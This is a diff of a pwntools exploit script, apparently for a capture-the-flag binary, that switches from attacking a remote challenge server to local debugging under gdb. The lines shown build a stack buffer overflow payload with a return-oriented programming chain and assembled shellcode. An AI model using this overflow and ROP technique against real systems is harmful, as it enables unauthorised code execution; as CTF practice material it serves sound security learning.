@@ -5,13 +5,13 @@ import string
 exe = ELF('./chall_patched')
 libc = ELF('./libc.so.6')
 
-# p = process(exe.path)
-# context.terminal = ['alacritty', '-e']
-# gdb.attach(p, gdbscript='''
-# # b*0x401100
-#            b*0x000000000040148c
-# b*read+16
-#            ''')
+p = process(exe.path)
+context.terminal = ['alacritty', '-e']
+gdb.attach(p, gdbscript='''
+# b*0x401100
+           b*0x000000000040148c
+b*read+16
+           ''')
 #################exploiting#####################
 shellcode = asm('''
 
@@ -52,7 +52,7 @@ leave_ret = 0x000000000040148c
 #####################################3
 for i in range(0,256):
 
-    p = remote('3.75.185.198',10000)
+    # p = remote('3.75.185.198',10000)
     payload = b'A'*32
     payload += p64(rw_section) 
     payload += p64(pop_rdi_rsi_rdx) + p64(container) + p64(0) + p64(0) + p64(ret) 
